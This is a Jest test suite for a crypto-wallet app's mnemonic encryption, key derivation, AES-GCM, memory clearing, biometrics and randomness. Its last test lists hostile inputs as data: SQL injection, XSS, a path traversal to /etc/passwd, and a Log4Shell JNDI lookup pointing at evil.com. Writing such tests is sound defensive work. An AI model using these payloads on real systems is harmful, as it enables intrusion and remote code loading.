/**
 * Security-focused tests for cryptographic operations
 * Tests for timing attacks, memory leaks, entropy, and other security vulnerabilities
 */

import { CryptoUtils } from '../../utils/CryptoUtils';
import { MemoryUtils } from '../../utils/MemoryUtils';
import { MnemonicTransformService } from '../../services/MnemonicTransformService';
import { BiometricService } from '../../services/BiometricService';

describe('Crypto Security Tests', () => {
    
    describe('Mnemonic Encryption Security', () => {
        it('should use cryptographically secure random salt generation', async () => {
            const salts = [];
            
            // Generate multiple salts and ensure they're unique
            for (let i = 0; i < 100; i++) {
                const salt = CryptoUtils.generateSalt(32);
                expect(salt.length).toBe(32);
                
                const saltHex = Array.from(salt).map(b => b.toString(16).padStart(2, '0')).join('');
                expect(salts).not.toContain(saltHex);
                salts.push(saltHex);
            }
            
            // Ensure high entropy (no duplicate bytes in sequence)
            const lastSalt = salts[salts.length - 1];
            const duplicatePattern = /(.{2})\1{2,}/; // Same byte repeated 3+ times
            expect(lastSalt).not.toMatch(duplicatePattern);
        });

        it('should resist timing attacks during password verification', async () => {
            const testMnemonic = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';
            const correctPassword = 'correct_password_123';
            const wrongPassword = 'wrong_password_456';
            
            // Transform mnemonic
            const transformed = await MnemonicTransformService.transformMnemonic(testMnemonic, correctPassword);
            
            // Measure timing for correct password
            const correctTimes = [];
            for (let i = 0; i < 10; i++) {
                const start = performance.now();
                try {
                    await MnemonicTransformService.restoreFromTransformed(transformed, correctPassword);
                } catch {}
                correctTimes.push(performance.now() - start);
            }
            
            // Measure timing for wrong password
            const wrongTimes = [];
            for (let i = 0; i < 10; i++) {
                const start = performance.now();
                try {
                    await MnemonicTransformService.restoreFromTransformed(transformed, wrongPassword);
                } catch {}
                wrongTimes.push(performance.now() - start);
            }
            
            // Calculate averages
            const avgCorrect = correctTimes.reduce((a, b) => a + b) / correctTimes.length;
            const avgWrong = wrongTimes.reduce((a, b) => a + b) / wrongTimes.length;
            
            // Timing difference should be minimal (< 20% difference)
            const timingDifference = Math.abs(avgCorrect - avgWrong) / Math.max(avgCorrect, avgWrong);
            expect(timingDifference).toBeLessThan(0.2);
        });

        it('should properly clear sensitive data from memory', async () => {
            const password = 'sensitive_password_123';
            const mnemonic = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';
            
            // Create secure buffers
            const passwordBuffer = new Uint8Array(Buffer.from(password, 'utf-8'));
            const mnemonicBuffer = new Uint8Array(Buffer.from(mnemonic, 'utf-8'));
            
            // Verify data is initially present
            expect(passwordBuffer[0]).not.toBe(0);
            expect(mnemonicBuffer[0]).not.toBe(0);
            
            // Clear memory
            MemoryUtils.zeroMemory(passwordBuffer);
            MemoryUtils.zeroMemory(mnemonicBuffer);
            
            // Verify all bytes are zeroed
            for (let i = 0; i < passwordBuffer.length; i++) {
                expect(passwordBuffer[i]).toBe(0);
            }
            for (let i = 0; i < mnemonicBuffer.length; i++) {
                expect(mnemonicBuffer[i]).toBe(0);
            }
        });

        it('should validate mnemonic transformation reversibility', async () => {
            const originalMnemonic = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';
            const password = 'test_password_123';
            
            // Transform and restore multiple times
            for (let i = 0; i < 5; i++) {
                const transformed = await MnemonicTransformService.transformMnemonic(originalMnemonic, password);
                expect(transformed.split(' ')).toHaveLength(36);
                
                const restored = await MnemonicTransformService.restoreFromTransformed(transformed, password);
                expect(restored).toBe(originalMnemonic);
            }
        });
    });

    describe('Key Derivation Security', () => {
        it('should use sufficient PBKDF2 iterations for security', async () => {
            const password = 'test_password';
            const salt = CryptoUtils.generateSalt(32);
            
            // Test with different iteration counts
            const weakIterations = 1000;
            const strongIterations = 100000;
            
            const start1 = performance.now();
            await CryptoUtils.deriveKey(password, salt, 32, weakIterations);
            const weakTime = performance.now() - start1;
            
            const start2 = performance.now();
            await CryptoUtils.deriveKey(password, salt, 32, strongIterations);
            const strongTime = performance.now() - start2;
            
            // Strong key derivation should take significantly longer
            expect(strongTime).toBeGreaterThan(weakTime * 10);
            expect(strongTime).toBeGreaterThan(50); // At least 50ms
        });

        it('should produce different keys for different inputs', async () => {
            const password1 = 'password1';
            const password2 = 'password2';
            const salt = CryptoUtils.generateSalt(32);
            
            const key1 = await CryptoUtils.deriveKey(password1, salt, 32, 100000);
            const key2 = await CryptoUtils.deriveKey(password2, salt, 32, 100000);
            
            // Keys should be completely different
            expect(key1).not.toEqual(key2);
            
            // Should have no common bytes in same positions
            let commonBytes = 0;
            for (let i = 0; i < key1.length; i++) {
                if (key1[i] === key2[i]) commonBytes++;
            }
            expect(commonBytes).toBeLessThan(key1.length * 0.1); // < 10% common
        });

        it('should generate unique keys with same password but different salts', async () => {
            const password = 'same_password';
            const salt1 = CryptoUtils.generateSalt(32);
            const salt2 = CryptoUtils.generateSalt(32);
            
            const key1 = await CryptoUtils.deriveKey(password, salt1, 32, 100000);
            const key2 = await CryptoUtils.deriveKey(password, salt2, 32, 100000);
            
            expect(key1).not.toEqual(key2);
        });
    });

    describe('AES Encryption Security', () => {
        it('should use unique IVs for each encryption', async () => {
            const plaintext = 'sensitive data to encrypt';
            const key = await CryptoUtils.deriveKey('password', CryptoUtils.generateSalt(32), 32, 100000);
            
            const ivs = [];
            
            // Encrypt same data multiple times
            for (let i = 0; i < 20; i++) {
                const encrypted = await CryptoUtils.encryptAES(plaintext, key);
                
                const ivHex = Array.from(encrypted.iv).map(b => b.toString(16).padStart(2, '0')).join('');
                expect(ivs).not.toContain(ivHex);
                ivs.push(ivHex);
                
                // Verify IV is 16 bytes for AES
                expect(encrypted.iv.length).toBe(16);
            }
        });

        it('should produce different ciphertexts for same plaintext', async () => {
            const plaintext = 'same plaintext data';
            const key = await CryptoUtils.deriveKey('password', CryptoUtils.generateSalt(32), 32, 100000);
            
            const ciphertexts = [];
            
            for (let i = 0; i < 10; i++) {
                const encrypted = await CryptoUtils.encryptAES(plaintext, key);
                const ciphertextHex = Array.from(encrypted.ciphertext).map(b => b.toString(16).padStart(2, '0')).join('');
                
                expect(ciphertexts).not.toContain(ciphertextHex);
                ciphertexts.push(ciphertextHex);
            }
        });

        it('should authenticate encrypted data with AEAD', async () => {
            const plaintext = 'authenticated data';
            const key = await CryptoUtils.deriveKey('password', CryptoUtils.generateSalt(32), 32, 100000);
            
            const encrypted = await CryptoUtils.encryptAES(plaintext, key);
            
            // Should include authentication tag
            expect(encrypted.tag).toBeDefined();
            expect(encrypted.tag.length).toBe(16); // 128-bit auth tag
            
            // Tamper with ciphertext
            const tamperedCiphertext = new Uint8Array(encrypted.ciphertext);
            tamperedCiphertext[0] ^= 0xFF; // Flip bits
            
            const tamperedEncrypted = {
                ...encrypted,
                ciphertext: tamperedCiphertext
            };
            
            // Decryption should fail
            await expect(CryptoUtils.decryptAES(tamperedEncrypted, key))
                .rejects.toThrow();
        });
    });

    describe('Memory Security', () => {
        it('should use constant-time comparison for sensitive data', () => {
            const data1 = new Uint8Array([1, 2, 3, 4, 5]);
            const data2 = new Uint8Array([1, 2, 3, 4, 5]);
            const data3 = new Uint8Array([1, 2, 3, 4, 6]);
            
            // Measure timing for equal comparison
            const equalTimes = [];
            for (let i = 0; i < 100; i++) {
                const start = performance.now();
                MemoryUtils.constantTimeEquals(data1, data2);
                equalTimes.push(performance.now() - start);
            }
            
            // Measure timing for unequal comparison
            const unequalTimes = [];
            for (let i = 0; i < 100; i++) {
                const start = performance.now();
                MemoryUtils.constantTimeEquals(data1, data3);
                unequalTimes.push(performance.now() - start);
            }
            
            const avgEqual = equalTimes.reduce((a, b) => a + b) / equalTimes.length;
            const avgUnequal = unequalTimes.reduce((a, b) => a + b) / unequalTimes.length;
            
            // Timing should be similar (constant-time)
            const timingDifference = Math.abs(avgEqual - avgUnequal) / Math.max(avgEqual, avgUnequal);
            expect(timingDifference).toBeLessThan(0.3); // Allow 30% variance due to JS limitations
        });

        it('should detect memory leaks during crypto operations', async () => {
            const initialMemory = process.memoryUsage();
            
            // Perform many crypto operations
            for (let i = 0; i < 100; i++) {
                const password = `password_${i}`;
                const salt = CryptoUtils.generateSalt(32);
                const key = await CryptoUtils.deriveKey(password, salt, 32, 1000);
                const plaintext = `data_${i}`;
                const encrypted = await CryptoUtils.encryptAES(plaintext, key);
                await CryptoUtils.decryptAES(encrypted, key);
                
                // Clear sensitive data
                MemoryUtils.zeroMemory(key);
                MemoryUtils.zeroMemory(salt);
            }
            
            // Force garbage collection if available
            if (global.gc) {
                global.gc();
            }
            
            const finalMemory = process.memoryUsage();
            const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
            
            // Memory increase should be minimal (< 10MB)
            expect(memoryIncrease).toBeLessThan(10 * 1024 * 1024);
        });
    });

    describe('Biometric Security', () => {
        it('should handle biometric failures securely', async () => {
            const biometricService = BiometricService.getInstance();
            
            // Mock biometric failure
            const mockPrompt = jest.fn().mockRejectedValue(new Error('Biometric authentication failed'));
            (biometricService as any).biometrics = {
                isSensorAvailable: jest.fn().mockResolvedValue({ available: true }),
                simplePrompt: mockPrompt
            };
            
            await expect(biometricService.authenticate('Test authentication'))
                .rejects.toThrow('Biometric authentication failed');
            
            // Should not leak sensitive information in error
            expect(mockPrompt).toHaveBeenCalledWith({
                promptMessage: 'Test authentication',
                cancelButtonText: 'Cancel'
            });
        });

        it('should properly cleanup after biometric operations', async () => {
            const biometricService = BiometricService.getInstance();
            
            // Mock successful authentication
            (biometricService as any).biometrics = {
                isSensorAvailable: jest.fn().mockResolvedValue({ available: true }),
                simplePrompt: jest.fn().mockResolvedValue({ success: true })
            };
            
            const result = await biometricService.authenticate('Test authentication');
            expect(result).toBe(true);
            
            // Verify cleanup was called (check internal state)
            expect((biometricService as any).lastAuthTime).toBeDefined();
        });
    });

    describe('Random Number Generation Security', () => {
        it('should pass basic randomness tests', () => {
            const randomData = CryptoUtils.generateSecureRandom(1000);
            
            // Chi-square test for uniformity
            const bins = new Array(256).fill(0);
            for (const byte of randomData) {
                bins[byte]++;
            }
            
            const expected = randomData.length / 256;
            let chiSquare = 0;
            for (const count of bins) {
                chiSquare += Math.pow(count - expected, 2) / expected;
            }
            
            // Chi-square critical value for 255 degrees of freedom at 95% confidence
            const critical = 293.25;
            expect(chiSquare).toBeLessThan(critical);
        });

        it('should not repeat sequences in random generation', () => {
            const sequences = new Set();
            
            for (let i = 0; i < 1000; i++) {
                const randomBytes = CryptoUtils.generateSecureRandom(8);
                const sequence = Array.from(randomBytes).join(',');
                
                expect(sequences.has(sequence)).toBe(false);
                sequences.add(sequence);
            }
        });
    });

    describe('Input Validation Security', () => {
        it('should reject invalid mnemonic inputs', async () => {
            const invalidInputs = [
                '', // Empty
                'only eleven words here not twelve or more words',
                'invalid words that are not in bip39 wordlist here',
                'abandon '.repeat(12).trim(), // All same word
                'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon', // 13 words
                null,
                undefined,
                123,
                {},
                []
            ];
            
            for (const invalid of invalidInputs) {
                await expect(
                    MnemonicTransformService.transformMnemonic(invalid as any, 'password')
                ).rejects.toThrow();
            }
        });

        it('should reject weak passwords', async () => {
            const validMnemonic = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';
            const weakPasswords = [
                '', // Empty
                '123', // Too short
                'password', // Common password
                'a', // Single character
                ' ', // Whitespace only
            ];
            
            for (const weakPassword of weakPasswords) {
                if (weakPassword.length < 4) {
                    await expect(
                        MnemonicTransformService.transformMnemonic(validMnemonic, weakPassword)
                    ).rejects.toThrow();
                }
            }
        });

        it('should sanitize inputs to prevent injection attacks', async () => {
            const validMnemonic = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';
            const maliciousInputs = [
                'password"; DROP TABLE users; --',
                'password\0null_byte',
                'password\n\r\t',
                'password<script>alert("xss")</script>',
                '../../../etc/passwd',
                '${jndi:ldap://evil.com/a}'
            ];
            
            // Should not crash or throw unexpected errors
            for (const maliciousInput of maliciousInputs) {
                try {
                    await MnemonicTransformService.transformMnemonic(validMnemonic, maliciousInput);
                } catch (error) {
                    // Should be a proper validation error, not a system error
                    expect(error.message).not.toContain('ENOENT');
                    expect(error.message).not.toContain('null_byte');
                }
            }
        });
    });
});

